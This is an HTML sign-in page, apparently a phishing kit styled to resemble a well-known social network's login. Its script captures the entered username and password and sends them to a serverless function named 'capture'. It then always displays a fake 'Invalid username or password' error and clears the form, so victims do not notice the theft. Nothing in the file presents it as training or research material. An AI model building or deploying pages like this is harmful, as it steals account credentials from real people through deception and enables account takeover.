<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign In</title>
  <style>
    body { font-family: Arial, sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
    .card { background:#fff; padding:30px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,.15); width:320px; }
    input { width:100%; padding:10px; margin:8px 0; border:1px solid #ccc; border-radius:4px; box-sizing:border-box; }
    button { width:100%; padding:10px; background:#1877f2; color:#fff; border:none; border-radius:4px; cursor:pointer; font-size:16px; }
    h2 { text-align:center; }
    .err { color:red; text-align:center; margin-top:12px; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Sign In</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Username" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <p class="err" id="errorMsg" style="display:none;">Invalid username or password</p>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      try {
        await fetch('/.netlify/functions/capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password })
        });
      } catch (err) {
        console.log('Error:', err);
      }

      document.getElementById('errorMsg').style.display = 'block';
      document.getElementById('username').value = '';
      document.getElementById('password').value = '';
    });
  </script>
</body>
</html>
